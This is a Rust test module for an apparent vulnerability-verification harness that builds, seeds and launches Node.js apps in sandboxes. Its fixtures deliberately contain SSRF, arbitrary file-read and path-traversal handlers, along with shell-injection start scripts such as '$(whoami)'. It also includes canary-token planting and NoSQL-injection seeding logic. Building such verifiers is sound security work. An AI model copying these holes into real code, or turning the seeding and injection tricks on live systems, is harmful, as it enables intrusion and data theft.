        let root = dir.path();
        write(
            root,
            "package.json",
            r#"{"dependencies":{"express":"^4","@scope/runtime":"^1","legacy-git":"git+ssh://git@github.com/example/legacy.git","git-shorthand":"owner/repository#v1","local-only":"file:../local"},"devDependencies":{"vite":"^6"}}"#,
        );
        std::fs::create_dir_all(root.join("node_modules/express")).unwrap();

        assert_eq!(
            missing_runtime_dependencies(root),
            vec!["@scope/runtime".to_owned()]
        );
        std::fs::create_dir_all(root.join("node_modules/@scope/runtime")).unwrap();
        assert!(missing_runtime_dependencies(root).is_empty());
    }

    #[test]
    fn runtime_dependency_repair_retries_but_never_hides_total_failure() {
        let dir = tempfile::tempdir().unwrap();
        let manifest = dir.path().join("package.json");
        write(
            dir.path(),
            "package.json",
            r#"{"dependencies":{"next":"^15","remote":"https://mirror.invalid/remote.tgz","sibling":"workspace:*"}}"#,
        );
        let command = runtime_dependency_repair_command(&manifest, &["next".to_owned()]).unwrap();
        assert_eq!(command.matches("npm install").count(), 3);
        assert!(command.contains("--package-lock=false"));
        assert!(command.contains("--workspaces=false"));
        assert!(command.contains("'next@^15'"));
        assert!(!command.contains("mirror.invalid"));
        assert!(!command.contains("workspace:*"));
        assert!(!command.contains("|| true"));
    }

    #[test]
    fn runtime_dependency_repair_temporarily_hides_non_registry_specs() {
        let dir = tempfile::tempdir().unwrap();
        let manifest = dir.path().join("package.json");
        let original = br#"{"dependencies":{"next":"^15","sibling":"workspace:*","archive":"https://mirror.invalid/a.tgz"},"devDependencies":{"tool":"file:../tool","typescript":"^5"}}"#;
        std::fs::write(&manifest, original).unwrap();
        let saved =
            prepare_registry_only_npm_manifest(&manifest, &std::collections::BTreeSet::new())
                .unwrap()
                .expect("non-registry specs are patched");
        let patched: serde_json::Value =
            serde_json::from_slice(&std::fs::read(&manifest).unwrap()).unwrap();
        assert_eq!(patched["dependencies"]["next"], "^15");
        assert_eq!(patched["devDependencies"]["typescript"], "^5");
        assert!(patched["dependencies"].get("sibling").is_none());
        assert!(patched["dependencies"].get("archive").is_none());
        assert!(patched["devDependencies"].get("tool").is_none());
        assert_eq!(saved, original);
    }

    #[test]
    fn runtime_dependency_repair_excludes_direct_packages_with_remote_transitives() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        write(
            root,
            "package.json",
            r#"{"dependencies":{"express":"^4","spreadsheet-wrapper":"^1"}}"#,
        );
        write(
            root,
            "package-lock.json",
            r#"{
              "lockfileVersion": 3,
              "packages": {
                "node_modules/express": {"dependencies":{"body-parser":"^1"}},
                "node_modules/spreadsheet-wrapper": {
                  "dependencies":{"sheet":"https://cdn.invalid/sheet.tgz"}
                }
              }
            }"#,
        );
        let missing = vec!["express".to_owned(), "spreadsheet-wrapper".to_owned()];
        let blocked = direct_dependencies_with_non_registry_transitives(root, &missing);
        assert_eq!(
            blocked,
            std::collections::BTreeSet::from(["spreadsheet-wrapper".to_owned()])
        );

        let manifest = root.join("package.json");
        let saved = prepare_registry_only_npm_manifest(&manifest, &blocked)
            .unwrap()
            .expect("the blocked direct dependency is patched");
        let patched: serde_json::Value =
            serde_json::from_slice(&std::fs::read(&manifest).unwrap()).unwrap();
        assert_eq!(patched["dependencies"]["express"], "^4");
        assert!(patched["dependencies"].get("spreadsheet-wrapper").is_none());
        let original: serde_json::Value = serde_json::from_slice(&saved).unwrap();
        assert_eq!(original["dependencies"]["spreadsheet-wrapper"], "^1");
    }

    #[test]
    fn runtime_dependency_repair_temporarily_hides_npm_lockfiles() {
        let dir = tempfile::tempdir().unwrap();
        let package_lock = br#"{"lockfileVersion":3,"packages":{}}"#;
        let shrinkwrap = br#"{"lockfileVersion":2}"#;
        std::fs::write(dir.path().join("package-lock.json"), package_lock).unwrap();
        std::fs::write(dir.path().join("npm-shrinkwrap.json"), shrinkwrap).unwrap();

        let saved = temporarily_remove_npm_lockfiles(dir.path()).unwrap();
        assert_eq!(saved.len(), 2);
        assert!(!dir.path().join("package-lock.json").exists());
        assert!(!dir.path().join("npm-shrinkwrap.json").exists());

        restore_npm_lockfiles(saved).unwrap();
        assert_eq!(
            std::fs::read(dir.path().join("package-lock.json")).unwrap(),
            package_lock
        );
        assert_eq!(
            std::fs::read(dir.path().join("npm-shrinkwrap.json")).unwrap(),
            shrinkwrap
        );
    }

    #[test]
    fn the_npm_install_prefers_a_peer_aware_install_before_the_legacy_fallback() {
        // A runtime dependency a package declares only as a peer (the classic `request-promise` ->
        // `request` split) is installed by a plain `npm install`, as modern npm does, but *not* by
        // `--legacy-peer-deps`. So the peer-aware install must be attempted before the legacy fallback.
        let command = install_command(PackageManager::Npm);
        let plain = command
            .find("npm install --no-audit --no-fund |")
            .expect("a peer-aware npm install is attempted");
        let legacy = command
            .find("--legacy-peer-deps")
            .expect("the legacy install remains as a fallback");
        assert!(
            plain < legacy,
            "the peer-aware install must come before the legacy one"
        );
    }

    #[test]
    fn a_mongodump_in_the_repository_is_discovered_for_restore() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        // A standard `mongodump` export: `<collection>.bson` beside `<collection>.metadata.json`.
        write(root, "database/dump/app/settings.bson", "\x00\x00\x00\x00");
        write(root, "database/dump/app/settings.metadata.json", "{}");
        write(root, "database/dump/app/users.bson", "\x00\x00\x00\x00");
        write(root, "database/dump/app/users.metadata.json", "{}");
        // Noise that is not a dump: a lone `.bson` with no metadata sibling, under node_modules.
        write(root, "node_modules/x/stray.bson", "\x00");
        let found = mongodump_dir(root).expect("the dump directory is found");
        assert!(found.ends_with("database/dump/app"));
    }

    #[test]
    fn the_nosql_lookup_seed_plants_a_record_the_sink_query_selects() {
        // The script carries the per-run sentinel, inserts for a filter that references it, copies a
        // scalar equality verbatim, and sets the injected operator field to a present value — while an
        // unrelated field is not forced, so an earlier guard query stays unmatched.
        let script = nosql_lookup_seed_script("deadbeefdeadbeefdeadbeef");
        assert!(script.contains("var ABSENT='deadbeefdeadbeefdeadbeef'"));
        assert!(script.contains("insertOne(doc)"));
        assert!(script.contains("jss_lookup_seed"));
        assert!(script.contains("doc[k]=ObjectId()"));
        assert!(script.contains("doc.id=doc[k].toString()"));
        // Only a filter that references the sentinel is planted.
        assert!(script.contains("JSON.stringify(filter).indexOf(ABSENT)<0"));
        // System collections are never seeded.
        assert!(script.contains("system."));
    }

    #[test]
    fn a_yarn_project_installs_with_corepack_and_runs_its_build() {
        // yarn/pnpm are provisioned by corepack; npm keeps its reproducible `ci` path.
        assert!(install_command(PackageManager::Yarn).contains("corepack enable"));
        assert!(install_command(PackageManager::Pnpm).contains("corepack enable"));
        assert!(install_command(PackageManager::Npm).contains("npm ci"));
        assert!(has_build_script(
            r#"{"scripts":{"build":"next build","start":"next start"}}"#
        ));
        // A `prebuild:x` key is not a `build` script.
        assert!(!has_build_script(r#"{"scripts":{"prebuild:x":"y"}}"#));

        let canary = Canary::new("tok".to_owned());
        let file = dockerfile(
            "node:22-slim",
            "/app",
            "/app",
            &canary,
            r#"["npm","start"]"#,
            3000,
            PackageManager::Yarn,
            Some("build"),
            false,
            &[],
        );
        assert!(file.contains("RUN corepack enable"), "{file}");
        assert!(file.contains("yarn run build"), "{file}");
        assert!(
            file.contains("node_modules/.bin/next build --webpack"),
            "a failed Next build is retried with the compatible webpack backend: {file}"
        );
        // The canary is planted under its extension variants, so a handler that appends a known
        // extension to the tainted path (`input + '.md'`) still reads the token.
        assert!(file.contains("/tmp/jss-canary-read.md"), "{file}");
        // No build step emitted for a package without one.
        let no_build = dockerfile(
            "node:22-slim",
            "/app",
            "/app",
            &canary,
            r#"["npm","start"]"#,
            3000,
            PackageManager::Npm,
            None,
            false,
            &[],
        );
        assert!(!no_build.contains("build"), "{no_build}");
        assert!(!build_command(PackageManager::Npm, "compile").contains("next build"));
    }

    #[test]
    fn a_compile_script_builds_a_missing_node_start_target() {
        let dir = tempfile::tempdir().unwrap();
        let manifest = r#"{
            "scripts": {
                "start": "node dist/index.js",
                "compile": "cp -r server dist"
            }
        }"#;

        assert_eq!(build_script(manifest, dir.path()), Some("compile"));
        write(dir.path(), "dist/index.js", "");
        assert_eq!(build_script(manifest, dir.path()), None);
        assert_eq!(
            build_script(
                r#"{"scripts":{"start":"node dist/index.js","build":"tsc"}}"#,
                dir.path(),
            ),
            Some("build")
        );
        write(dir.path(), "server.js", "");
        assert_eq!(
            build_script(
                r#"{"scripts":{"start":"node server.js","compile":"echo nope"}}"#,
                dir.path(),
            ),
            None
        );
    }

    #[test]
    fn a_route_in_a_separate_service_package_launches_that_package() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        write(
            root,
            "package.json",
            r#"{"scripts":{"start":"next start"}}"#,
        );
        write(root, "pages/api/x.js", "");
        // A service with no scripts, started by its `main` file.
        write(
            root,
            "svc/package.json",
            r#"{"name":"svc","main":"index.js"}"#,
        );
        write(root, "svc/index.js", "");
        write(root, "svc/routes/media.js", "");
        // A library package nested in the repo: nothing to launch, so the root app serves it.
        write(root, "lib/util/package.json", r#"{"name":"util"}"#);
        write(root, "lib/util/route.js", "");

        let path = std::path::Path::new;
        assert_eq!(app_dir(root, path("svc/index.js")), path("svc"));
        assert_eq!(app_dir(root, path("svc/routes/media.js")), path("svc"));
        assert_eq!(app_dir(root, path("pages/api/x.js")), path(""));
        assert_eq!(app_dir(root, path("server.js")), path(""));
        assert_eq!(app_dir(root, path("lib/util/route.js")), path(""));

        assert_eq!(
            manifest_start_command(&root.join("svc")).as_deref(),
            Some(r#"["node","index.js"]"#)
        );
        assert_eq!(
            manifest_start_command(root).as_deref(),
            Some(r#"["npm","start"]"#)
        );
        assert_eq!(manifest_start_command(&root.join("lib/util")), None);
    }

    #[test]
    fn a_next_start_uses_dev_when_the_production_build_is_missing() {
        let dir = tempfile::tempdir().unwrap();
        write(
            dir.path(),
            "package.json",
            r#"{"scripts":{"build":"next build","start":"next start","dev":"next dev"}}"#,
        );
        let command = manifest_start_command(dir.path()).unwrap();
        assert!(command.contains("[ -f .next/BUILD_ID ]"), "{command}");
        assert!(command.contains("npm start"), "{command}");
        assert!(command.contains("npm run dev -- --webpack"), "{command}");
        assert!(command.contains("npm run dev -- --hostname"), "{command}");

        // A non-Next dev server and a Next package with no dev script retain the production launch.
        write(
            dir.path(),
            "package.json",
            r#"{"scripts":{"start":"next start","dev":"vite"}}"#,
        );
        assert_eq!(
            manifest_start_command(dir.path()).as_deref(),
            Some(r#"["npm","start"]"#)
        );
    }

    #[test]
    fn a_process_manager_start_runs_the_wrapped_entry_directly() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        // `pm2 start server.js --name GC` daemonizes a process manager that is not a dependency of the
        // app and is absent from the image; the honest launch is the very file it would run.
        write(
            root,
            "server.js",
            "require('http').createServer(()=>{}).listen(3000);\n",
        );
        for start in [
            r#"{"scripts":{"start":"pm2 start server.js --name GC"}}"#,
            r#"{"scripts":{"start":"pm2-runtime start server.js"}}"#,
            r#"{"scripts":{"start":"forever server.js"}}"#,
            r#"{"scripts":{"start":"nodemon server.js"}}"#,
        ] {
            write(root, "package.json", start);
            assert_eq!(
                manifest_start_command(root).as_deref(),
                Some(r#"["node","server.js"]"#),
                "{start}"
            );
        }
        // A process manager pointed at an ecosystem/config file (not a server) is left to npm.
        write(
            root,
            "ecosystem.config.js",
            "module.exports = { apps: [] };\n",
        );
        write(
            root,
            "package.json",
            r#"{"scripts":{"start":"pm2 start ecosystem.config.js"}}"#,
        );
        assert_eq!(
            manifest_start_command(root).as_deref(),
            Some(r#"["npm","start"]"#)
        );
    }

    #[test]
    fn a_plain_node_start_runs_the_server_process_directly_with_its_arguments() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        write(
            root,
            "app.js",
            "require('http').createServer(()=>{}).listen(3000);\n",
        );
        write(
            root,
            "package.json",
            r#"{"scripts":{"start":"node app.js --fakeEmail --digestInterval -1 $@"}}"#,
        );
        assert_eq!(
            manifest_start_command(root).as_deref(),
            Some(r#"["node","app.js","--fakeEmail","--digestInterval","-1"]"#)
        );

        for start in [
            "node app.js && echo done",
            "node app.js | tee output.log",
            "node app.js > output.log",
            "node app.js $(whoami)",
            "node app.js '$HOME'",
            "node app.js $@ --after",
        ] {
            write(
                root,
                "package.json",
                &format!(
                    r#"{{"scripts":{{"start":{}}}}}"#,
                    serde_json::to_string(start).unwrap()
                ),
            );
            assert_eq!(
                manifest_start_command(root).as_deref(),
                Some(r#"["npm","start"]"#),
                "{start}"
            );
        }
    }

    #[test]
    fn an_ephemeral_mongo_launcher_runs_next_directly_against_the_sidecar() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        // `node scripts/dev.js` boots an in-process `mongodb-memory-server` (which downloads a binary
        // and fails offline) only to mint a URL, then execs `next dev src`. The honest launch runs Next
        // directly against the verifier's MongoDB sidecar, the app's own `MONGO_URI` production mode.
        write(
            root,
            "scripts/dev.js",
            "const { MongoMemoryServer } = require('mongodb-memory-server')\n\
             ;(async () => { const m = await MongoMemoryServer.create();\n\
             require('child_process').exec(`npx next dev ${process.argv[2]||'src'} -p 3005`); })()\n",
        );
        write(root, "src/next.config.ts", "export default {}\n");
        write(
            root,
            "src/app/page.tsx",
            "export default function P(){return null}\n",
        );
        write(
            root,
            "package.json",
            r#"{"scripts":{"start":"node scripts/dev.js","dev":"node scripts/dev.js"},"dependencies":{"next":"15","mongoose":"8"}}"#,
        );
        assert_eq!(
            manifest_start_command(root).as_deref(),
            Some(r#"["sh","-c","exec npx next dev src --hostname 0.0.0.0 -p \"$PORT\""]"#)
        );
        assert_eq!(
            local_ephemeral_mongo_next_launch(root).as_deref(),
            Some(r#"["sh","-c","exec npm start -- src \"$PORT\""]"#)
        );
        // A plain launcher that does not provision an ephemeral MongoDB is executed directly.
        write(
            root,
            "scripts/dev.js",
            "require('child_process').exec('npx next dev src')\n",
        );
        assert_eq!(
            manifest_start_command(root).as_deref(),
            Some(r#"["node","scripts/dev.js"]"#)
        );
        assert!(local_ephemeral_mongo_next_launch(root).is_none());
    }

    #[test]
    fn a_frontend_manifest_launches_the_findings_own_backend_server() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        // A create-react-app repo: the only launch is the front-end dev server, but the vulnerable
        // route lives in a self-contained Express backend started separately in production.
        write(
            root,
            "package.json",
            r#"{"scripts":{"start":"react-scripts start","build":"react-scripts build"}}"#,
        );
        write(
            root,
            "server.mjs",
            "import express from 'express';\n\
             const app = express();\n\
             app.use('/clients', (req, res) => {});\n\
             app.listen(80);\n",
        );
        let path = std::path::Path::new;
        assert!(manifest_launch_is_frontend(root));
        // The front-end launch is bypassed in favour of running the standalone backend directly.
        assert_eq!(
            start_command(root, Some(path("server.mjs"))).as_deref(),
            Some(r#"["node","server.mjs"]"#)
        );
        // With no standalone backend to run, the manifest launch still wins.
        write(root, "notaserver.mjs", "console.log('hi');\n");
        assert_eq!(
            start_command(root, Some(path("notaserver.mjs"))).as_deref(),
            Some(r#"["npm","start"]"#)
        );
    }

    #[test]
    fn a_privilege_dropping_app_runs_as_the_identity_it_drops_to() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        // An app that reads its uid/gid/port from the environment and drops root at startup.
        write(
            root,
            "server.mjs",
            "const port = parseInt(process.env.ASYMPTOTE_PORT);\n\
             app.listen(port);\n",
        );
        write(
            root,
            "util.mjs",
            "export function dropRootPermission() {\n\
               const uid = parseInt(process.env.ASYMPTOTE_UID);\n\
               const gid = parseInt(process.env.ASYMPTOTE_GID);\n\
               process.setgid(gid);\n\
               process.setuid(uid);\n\
             }\n",
        );
        let fixture = privilege_drop_fixture(root, 3000).expect("a privilege drop is detected");
        assert_eq!(fixture.run_as, (SANDBOX_RUN_UID, SANDBOX_RUN_GID));
        let value = |name: &str| {
            fixture
                .env
                .iter()
                .find(|e| e.name == name)
                .map(|e| e.value.as_str())
        };
        // uid/gid variables point at the runtime identity, so the drop is a legal no-op; the port
        // variable is pinned to the sandbox port a non-root process can bind.
        assert_eq!(
            value("ASYMPTOTE_UID"),
            Some(SANDBOX_RUN_UID.to_string().as_str())
        );
        assert_eq!(
            value("ASYMPTOTE_GID"),
            Some(SANDBOX_RUN_GID.to_string().as_str())
        );
        assert_eq!(value("ASYMPTOTE_PORT"), Some("3000"));

        let local = adapt_privilege_drop_to_local_identity(
            privilege_drop_fixture(root, 3000).expect("a privilege drop is detected"),
            (501, 20),
        );
        assert_eq!(local.run_as, (501, 20));
        assert_eq!(
            local
                .env
                .iter()
                .find(|env| env.name == "ASYMPTOTE_UID")
                .map(|env| env.value.as_str()),
            Some("501")
        );
        assert_eq!(
            local
                .env
                .iter()
                .find(|env| env.name == "ASYMPTOTE_GID")
                .map(|env| env.value.as_str()),
            Some("20")
        );

        // An app that never drops privileges gets no forced runtime user.
        let plain = tempfile::tempdir().unwrap();
        write(
            plain.path(),
            "server.mjs",
            "app.listen(process.env.PORT);\n",
        );
        assert!(privilege_drop_fixture(plain.path(), 3000).is_none());
    }

    #[test]
    fn env_var_names_reads_dot_and_bracket_accessors() {
        let names = env_var_names(
            "a=process.env.FOO; b=process.env['BAR']; c=process.env[\"BAZ\"]; d=process.env[k];",
        );
        assert!(names.contains(&"FOO".to_owned()));
        assert!(names.contains(&"BAR".to_owned()));
        assert!(names.contains(&"BAZ".to_owned()));
        // A dynamic (non-literal) key is not a name.
        assert!(!names.iter().any(|n| n == "k"));
    }

    #[test]
    fn a_provider_lifecycle_module_is_launched_through_the_lifecycle_host() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        // An OS.js/meeseOS-style app package: a factory that registers routes on `core.app` through
        // the host's `proc.resource` namespacing, with no launch script and no `main`, and
        // `workspace:` sibling devDependencies npm cannot resolve. Its real runtime dependency is a
        // plain registry package.
        write(
            root,
            "apps/widget/package.json",
            r#"{"name":"widget","scripts":{"build":"webpack"},"dependencies":{"axios":"^1"},"devDependencies":{"cfg":"workspace:*"}}"#,
        );
        write(
            root,
            "apps/widget/server.js",
            "const axios = require(\"axios\");\n\
             module.exports = (core, proc) => ({\n\
               init: async () => {\n\
                 const { app } = core;\n\
                 app.post(proc.resource(\"/fetch\"), (req, res) => {\n\
                   axios.get(req.body.target).then((r) => res.json(r.data));\n\
                 });\n\
               },\n\
             });\n",
        );
        let path = std::path::Path::new;
        // No launchable manifest, but the module is a provider-shaped server, so its own package
        // directory (where its dependency is declared and installs) is the app.
        assert!(is_lifecycle_server_module(
            &root.join("apps/widget/server.js")
        ));
        assert_eq!(manifest_start_command(&root.join("apps/widget")), None);
        assert_eq!(
            app_dir(root, path("apps/widget/server.js")),
            path("apps/widget")
        );
        assert_eq!(
            start_command(&root.join("apps/widget"), Some(path("server.js"))).as_deref(),
            Some(r#"["node","/jss-lifecycle-host.mjs","server.js"]"#)
        );
        // A plain module that registers no route and is not a provider server is not matched.
        write(
            root,
            "apps/widget/util.js",
            "module.exports = (a) => a + 1;\n",
        );
        assert!(!is_lifecycle_server_module(
            &root.join("apps/widget/util.js")
        ));

        // Installing with npm neutralizes the `workspace:` specifiers first (npm aborts the whole
        // install on them, so even the runtime dependency never installs), and the lifecycle host
        // shim is planted in the image.
        let canary = Canary::new("tok".to_owned());
        let file = dockerfile(
            "node:22-slim",
            "/app/apps/widget",
            "/app/apps/widget",
            &canary,
            r#"["node","/jss-lifecycle-host.mjs","server.js"]"#,
            3000,
            PackageManager::Npm,
            Some("build"),
            false,
            &[],
        );
        assert!(file.contains(NPM_WORKSPACE_FIXUP), "{file}");
        assert!(file.contains("/jss-lifecycle-host.mjs"), "{file}");
        // yarn understands `workspace:`, so the fixup is not applied there.
        let yarn = dockerfile(
            "node:22-slim",
            "/app/apps/widget",
            "/app/apps/widget",
            &canary,
            r#"["node","/jss-lifecycle-host.mjs","server.js"]"#,
            3000,
            PackageManager::Yarn,
            Some("build"),
            false,
            &[],
        );
        assert!(!yarn.contains(NPM_WORKSPACE_FIXUP), "{yarn}");
    }

    #[test]
    fn a_node_red_node_module_is_launched_through_the_node_red_host() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        // A Node-RED node module: the runtime loads it by calling `module.exports = function (RED)`,
        // and it registers an admin HTTP route on `RED.httpAdmin`. Its manifest has no launch script
        // and a `main` that does not resolve to a file, so only the node-red host can serve it.
        write(
            root,
            "package.json",
            r#"{"name":"node-red-contrib-x","main":"node","dependencies":{"debug":"^4"}}"#,
        );
        write(
            root,
            "src/x.js",
            "module.exports = function (RED) {\n\
               RED.nodes.registerType('x', function () {});\n\
               RED.httpAdmin.post('/x/:id', RED.auth.needsPermission('x.read'), function (req, res) {\n\
                 const fs = require('fs');\n\
                 fs.readFile(req.body.mapPath, (e, d) => res.status(200).json(String(d)));\n\
               });\n\
             };\n",
        );
        let path = std::path::Path::new;
        assert!(is_node_red_node_module(&root.join("src/x.js")));
        // No launchable manifest, so the node-red host shim is selected for the node's own file.
        assert_eq!(manifest_start_command(root), None);
        assert_eq!(
            start_command(root, Some(path("src/x.js"))).as_deref(),
            Some(r#"["node","/jss-node-red-host.mjs","src/x.js"]"#)
        );
        // A plain helper that registers no `httpAdmin`/`httpNode` route exposes no HTTP entry point.
        write(root, "src/util.js", "module.exports = (a) => a + 1;\n");
        assert!(!is_node_red_node_module(&root.join("src/util.js")));
        // The node-red host shim is planted in the image.
        let canary = Canary::new("tok".to_owned());
        let file = dockerfile(
            "node:22-slim",
            "/app",
            "/app",
            &canary,
            r#"["node","/jss-node-red-host.mjs","src/x.js"]"#,
            3000,
            PackageManager::Npm,
            None,
            false,
            &[],
        );
        assert!(file.contains("/jss-node-red-host.mjs"), "{file}");
    }

    #[test]
    fn a_start_script_that_detaches_its_server_runs_it_in_the_foreground() {
        for (script, file) in [
            (
                "./scripts/start.js > /dev/null 2>&1 & disown",
                Some("./scripts/start.js"),
            ),
            ("nohup node server.js &", Some("server.js")),
            ("node dist/main.mjs >>log.txt 2>&1 &", Some("dist/main.mjs")),
            ("node server.js", None),
            ("node server.js && echo done &", None),
            ("node a.js & node b.js &", None),
            ("node --inspect server.js &", None),
            ("node server.js | tee log &", None),
            ("node server.js > $(pwd)/log &", None),
            ("./build.sh &", None),
        ] {
            assert_eq!(detached_script(script), file, "{script}");
        }

        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        write(
            root,
            "package.json",
            r#"{"main":"main.js","scripts":{"start":"./scripts/start.js > /dev/null 2>&1 & disown"}}"#,
        );
        // The detached file must exist in the package.
        assert_eq!(
            manifest_start_command(root).as_deref(),
            Some(r#"["npm","start"]"#)
        );
        write(root, "scripts/start.js", "");
        assert_eq!(
            manifest_start_command(root).as_deref(),
            Some(r#"["node","scripts/start.js"]"#)
        );
        write(
            root,
            "package.json",
            r#"{"scripts":{"start":"node ../outside.js &"}}"#,
        );
        assert_eq!(
            manifest_start_command(root).as_deref(),
            Some(r#"["npm","start"]"#)
        );
    }

    #[test]
    fn a_standalone_server_file_is_launched_when_no_manifest_can_be() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        // A self-contained server in a subdirectory, with no package.json anywhere.
        write(
            root,
            "tools/viewer/server.js",
            "const http=require('http');\n\
             http.createServer((req,res)=>res.end('ok')).listen(8000);\n",
        );
        // A plain helper that only exports a handler is not a launchable server.
        write(
            root,
            "tools/viewer/app.js",
            "module.exports = (req, res) => res.end('ok');\n",
        );

        let path = std::path::Path::new;
        assert!(is_standalone_server(&root.join("tools/viewer/server.js")));
        assert!(!is_standalone_server(&root.join("tools/viewer/app.js")));

        // The finding's own directory serves it, and the file is run directly with node.
        let app = app_dir(root, path("tools/viewer/server.js"));
        assert_eq!(app, path("tools/viewer"));
        assert_eq!(
            start_command(&root.join(&app), Some(path("server.js"))).as_deref(),
            Some(r#"["node","server.js"]"#)
        );
        // The non-server helper, even though it exists, is never launched this way.
        assert_eq!(app_dir(root, path("tools/viewer/app.js")), path(""));
        assert_eq!(start_command(&root.join(&app), Some(path("app.js"))), None);
    }

    #[test]
    fn a_standalone_server_reading_cwd_relative_files_runs_from_the_enclosing_directory() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        let path = std::path::Path::new;
        // A preview server kept under `scripts/` that loads its config and static root relative to
        // the working directory: it is meant to run as `node scripts/preview.mjs` from the project.
        write(root, "package.json", r#"{"private":true}"#);
        write(root, "site.json", "{}");
        write(root, "public/index.html", "<p>hi</p>");
        write(
            root,
            "scripts/preview.mjs",
            "import { createServer } from 'node:http';\n\
             import { readFileSync } from 'node:fs';\n\
             import { resolve } from 'node:path';\n\
             const ROOT = resolve(process.cwd(), \"public\");\n\
             const cfg = JSON.parse(readFileSync(\"site.json\", \"utf8\"));\n\
             createServer((req, res) => res.end(readFileSync(ROOT + req.url))).listen(8000);\n",
        );
        let app = app_dir(root, path("scripts/preview.mjs"));
        assert_eq!(app, path(""));
        assert_eq!(
            start_command(&root.join(&app), Some(path("scripts/preview.mjs"))).as_deref(),
            Some(r#"["node","scripts/preview.mjs"]"#)
        );
        assert_eq!(
            session_key(root, &app, path("scripts/preview.mjs")),
            path("scripts/preview.mjs")
        );

        // When the files are beside the server (or nowhere in the checkout), its own directory is
        // still the launch directory.
        write(
            root,
            "tools/local/server.js",
            "const http=require('http');const fs=require('fs');\n\
             const t=fs.readFileSync('./page.html');\n\
             http.createServer((q,s)=>s.end(t)).listen(8000);\n",
        );
        write(root, "tools/local/page.html", "x");
        write(root, "page.html", "x");
        assert_eq!(
            app_dir(root, path("tools/local/server.js")),
            path("tools/local")
        );
        write(
            root,
            "tools/missing/server.js",
            "const http=require('http');const fs=require('fs');\n\
             const t=fs.readFileSync('nowhere.txt');\n\
             http.createServer((q,s)=>s.end(t)).listen(8000);\n",
        );
        assert_eq!(
            app_dir(root, path("tools/missing/server.js")),
            path("tools/missing")
        );
        // `__dirname`-anchored and parent-escaping paths are not working-directory literals.
        assert_eq!(
            cwd_relative_literals(
                "readFileSync(join(__dirname,'a.json'));existsSync('../b');readFile(`${x}`);\
                 readFileSync('/etc/c');statSync(\"d/e.txt\")"
            ),
            vec!["d/e.txt".to_owned()]
        );
    }

    #[test]
    fn an_uninvoked_exported_server_start_uses_the_manifest_entrypoint() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        write(
            root,
            "package.json",
            r#"{"scripts":{"start":"node entry.js"}}"#,
        );
        write(
            root,
            "src/server.js",
            "import http from 'node:http';\n\
             export async function startServer() {\n\
               const server = http.createServer((_req, res) => res.end('ok'));\n\
               server.listen(3000);\n\
             }\n",
        );
        write(
            root,
            "entry.js",
            "import { startServer } from './src/server.js';\nawait startServer();\n",
        );
        assert!(!is_standalone_server(&root.join("src/server.js")));
        assert_eq!(
            start_command(root, Some(std::path::Path::new("src/server.js"))).as_deref(),
            Some(r#"["node","entry.js"]"#)
        );

        write(
            root,
            "src/server.js",
            "import http from 'node:http';\n\
             export async function startServer() {\n\
               http.createServer((_req, res) => res.end('ok')).listen(3000);\n\
             }\n\
             await startServer();\n",
        );
        assert!(is_standalone_server(&root.join("src/server.js")));
    }

    #[test]
    fn a_filesystem_route_handler_module_is_hosted_when_no_manifest_can_be() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        let path = std::path::Path::new;
        // A convention-based file-system route: method as the file name, under a `routes` tree, a
        // descriptor object exporting the handler under `fn`. No launchable manifest anywhere.
        write(
            root,
            "services/api/routes/query_url/get.js",
            "export default {\n\
             \tuseContexts: [\"redis\"],\n\
             \tfn: async (req, res, ctx) => {\n\
             \t\tconst url = req.query.url\n\
             \t\treturn await fetch(url, { method: \"HEAD\" })\n\
             \t},\n\
             }\n",
        );
        // A bare-function handler form under the same convention.
        write(
            root,
            "services/api/routes/ping/get.js",
            "export default () => ({ ok: true })\n",
        );
        // A plain data module whose file name is a method but exports no handler is not matched.
        write(
            root,
            "services/api/routes/config/get.js",
            "export default { timeout: 5000 }\n",
        );
        // A method-named module outside any `routes` tree is not matched.
        write(
            root,
            "lib/get.js",
            "export default (req, res) => res.end()\n",
        );

        assert!(is_route_handler_module(
            &root.join("services/api/routes/query_url/get.js")
        ));
        assert!(is_route_handler_module(
            &root.join("services/api/routes/ping/get.js")
        ));
        assert!(!is_route_handler_module(
            &root.join("services/api/routes/config/get.js")
        ));
        assert!(!is_route_handler_module(&root.join("lib/get.js")));

        // The finding's own directory serves it, and it is launched through the route host shim.
        let app = app_dir(root, path("services/api/routes/query_url/get.js"));
        assert_eq!(app, path("services/api/routes/query_url"));
        assert_eq!(
            start_command(&root.join(&app), Some(path("get.js"))).as_deref(),
            Some(r#"["node","/jss-route-host.mjs","get.js"]"#)
        );
        // The data module, even though it exists, is never launched this way.
        assert_eq!(
            app_dir(root, path("services/api/routes/config/get.js")),
            path("")
        );
    }

    #[test]
    fn an_express_router_behind_a_cli_main_is_hosted_not_run_as_the_cli() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        let path = std::path::Path::new;
        // A manifest whose only launch is a commander CLI: run bare it prints usage and exits
        // without binding a port, so the route under test would never be served.
        write(
            root,
            "package.json",
            r#"{"type":"module","main":"src/cli/index.js"}"#,
        );
        write(
            root,
            "src/cli/index.js",
            "import { Command } from 'commander';\n\
             const program = new Command();\n\
             program.command('serve').action(() => {});\n\
             program.parse(process.argv);\n",
        );
        // The finding's own file publishes routes on an express.Router but never listens itself.
        write(
            root,
            "src/server/api.js",
            "import express from 'express';\n\
             export function apiRouter(ws) {\n\
               const router = express.Router();\n\
               router.get('/x', (req, res) => res.end('ok'));\n\
               return router;\n\
             }\n",
        );

        assert!(is_cli_dispatcher(&root.join("src/cli/index.js")));
        assert!(!is_cli_dispatcher(&root.join("src/server/api.js")));
        assert!(is_express_router_module(&root.join("src/server/api.js")));
        assert!(!is_express_router_module(&root.join("src/cli/index.js")));
